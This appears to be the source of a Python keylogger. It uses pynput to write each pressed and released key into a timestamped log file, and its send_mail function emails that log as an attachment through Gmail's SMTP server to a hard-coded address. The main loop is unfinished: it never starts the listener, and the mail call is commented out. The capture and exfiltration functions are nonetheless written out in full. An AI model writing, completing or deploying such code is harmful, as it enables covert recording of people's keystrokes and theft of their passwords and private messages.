from pynput import keyboard
import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
# MIMEText for creating body of the email message.
from email.mime.text import MIMEText
# MIMEApplication attaching application-specific data (like CSV files) to email messages.
from email.mime.application import MIMEApplication
import time
import threading


def countdown():
    sec = 10

    while sec >= 1:
        # print(sec)
        sec -= 1
        time.sleep(1)

    return False

def send_mail(filename):
    print("SENDING MAIL IN TRANSIT ----->>>")
    HOST = "smtp.gmail.com"
    PORT = 587

    FROM_EMAIL = "fromemail@gmail.com"
    TO_EMAIL = "toemail@gmail.com"

    PASSWORD = "password here"

    SUBJECT = "Mail sent using python!"
    MESSAGE = """
    Hi,
    Its a test mail.

    Regards
    thegenetic
    """
    PATH_TO_FILE = filename

    # Forming the message body
    message = MIMEMultipart()
    message['Subject'] = SUBJECT
    message['From'] = FROM_EMAIL
    message['To'] = TO_EMAIL
    body_part = MIMEText(MESSAGE)
    message.attach(body_part)

    # Attaching the file
    with open(PATH_TO_FILE, 'rb') as file:
        message.attach(MIMEApplication(file.read(), Name="13-11-2024_14-53-40.txt"))


    smtp = smtplib.SMTP(HOST, PORT)
    status_code, response = smtp.ehlo()
    print(f"[*] Echoing the server: {status_code} {response}")

    status_code, response = smtp.starttls()
    print(f"[*] Establishing a secure tls connection: {status_code} {response}")

    status_code, response = smtp.login(FROM_EMAIL, PASSWORD)
    print(f"[*] Loggin in: {status_code} {response}")

    smtp.sendmail(FROM_EMAIL, TO_EMAIL, message.as_string())
    smtp.close()





def on_press(key):
    print("-------------> ",key)
    try:
        temp = key.char + " --- " 
        print('alphanumeric key {0} pressed\n'.format(
            key.char))
    except AttributeError:
        temp = str(key) + " --- "
        print('special key {0} pressed\n'.format(
            key))
        
    f.write(temp)
        

def on_release(key):
    temp = str(key) + " --- "
    print('{0} released'.format(
        key))
    f.write(temp)

    if key == keyboard.Key.esc:
        # Stop listener
        return False
    

def start_func(filename):
    print("HELLOO")
    # creating a file for logging the events
    global f
    f = open(filename, "a")

    
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
        

    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()

    f.close()


if __name__ == "__main__":
    
    while True:
        filename = datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S")+".txt"
        while (countdown() != False):
            print(filename)
            

        # send_mail(filename)
